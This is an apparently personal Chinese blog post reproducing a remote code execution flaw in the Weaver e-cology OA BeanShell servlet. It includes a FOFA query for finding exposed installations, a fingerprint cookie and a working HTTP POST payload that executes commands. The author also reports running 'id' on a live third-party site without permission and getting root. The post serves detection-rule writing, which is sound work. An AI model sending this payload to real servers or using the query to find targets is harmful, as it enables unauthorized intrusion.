---
layout:     post
title:      泛微ecology OA系统远程代码执行漏洞
subtitle:   泛微ecology OA
date:       2019-09-23
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - 漏洞复现
---
## 前言
最近在给公司写指纹规则、漏洞检测和利用规则，因此漏洞复现的文章更新会比较频繁。
## 0x00 漏洞介绍
* 漏洞名称：泛微e-cology OA系统远程代码执行漏洞
* CVE编号：N/A
* 发布时间：2019-09-19
* 漏洞说明：泛微 e-cology OA 系统自带 BeanShell 组件且开放未授权访问，攻击者调用 BeanShell 组件接口可直接在目标服务器上执行任意命令。
* 影响范围：泛微 e-cology<=9.0
* 修复建议：1、关闭 BeanShell 接口； 2、安装厂商发布的安全补丁

## 0x01 复现漏洞
从漏洞介绍中，我们知道这是一个未授权访问导致的远程代码执行漏洞，以下接口就是未授权范围的一个接口：
```
/weaver/bsh.servlet.BshServlet
```

由于本地环境环境不好搭建，我先从FOFA网络空间搜索引擎中先搜一个站点获取到泛微e-cology的指纹和尝试输出打印命令：
FOFA搜索语法如下：
```
app="泛微-协同办公OA"&&app="泛微协同商务系统"
```
我选一个存在漏洞的网址进行下无损测试
在域名后面拼接上漏洞路径后访问如下，包含关键词"BeanShell Test Servlet"，这在写策略的时候是需要的，需要记录一下：
![图片](../../../../img/ecologyoa_rce_1.png)

先不着急执行命令，我们来找一下Web指纹，我发现Set-Cookie中含有ecology关键词，那么就以这个来作为泛微e-cology OA系统的指纹规则：
```
Set-Cookie: ecology_JSessionId
```

然后我们在执行一个打印输出命令并对HTTP请求进行抓取，并对HTTP包的一些字段进行删除，最简HTTP请求包如下所示：
```
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: $HOST_PORT$
Content-Length: 50
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36

bsh.script=exec%28%22echo+security%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A
```

最后我还是没忍住，输入了一个id命令查询了一下用户ID，如下图所示，你没有看错就是最高权限！
吓得我急忙关闭。
![图片](../../../../img/ecologyoa_rce_2.png)
## 0x02 总结
今天遇到的最多的就是问题，主要是扫描器还没很完善，在正则表达式的匹配上面有问题，花了很多时间，一直在搞正则，没想到是程序设计的问题。
保存漏洞策略的时候也遇到了保存失败的问题，忘记了Windows下不能以有一些特殊字符来命令文件，比如大于号小于号问好等等。
